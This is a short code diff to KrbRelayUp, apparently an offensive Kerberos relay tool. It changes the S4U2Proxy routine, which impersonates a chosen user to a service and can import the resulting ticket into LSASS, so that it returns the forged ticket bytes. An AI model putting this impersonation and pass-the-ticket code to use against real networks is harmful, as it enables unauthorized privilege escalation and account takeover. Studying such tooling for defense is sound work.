@@ -176,7 +176,7 @@ namespace KrbRelayUp
             return null;
         }
 
-        public static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null)
+        public static byte[] S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null)
         {
             Console.WriteLine("[+] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
 
@@ -251,7 +251,7 @@ namespace KrbRelayUp
             if (String.IsNullOrEmpty(proxyUrl))
             {
                 string dcIP = Networking.GetDCIP(domainController);
-                if (String.IsNullOrEmpty(dcIP)) { return; }
+                if (String.IsNullOrEmpty(dcIP)) { return null; }
 
                 Console.WriteLine("[+] Sending S4U2proxy request to domain controller {0}:88", dcIP);
 
@@ -266,7 +266,7 @@ namespace KrbRelayUp
             }
             if (response2 == null)
             {
-                return;
+                return null;
             }
 
             // decode the supplied bytes to an AsnElt object
@@ -353,6 +353,7 @@ namespace KrbRelayUp
                     // pass-the-ticket -> import into LSASS
                     LSA.ImportTicket(kirbiBytes, new LUID());
                 }
+                return kirbiBytes;
             }
             else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
             {
@@ -364,7 +365,8 @@ namespace KrbRelayUp
             {
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
+            return null;
         }
-
+        
     }
 }
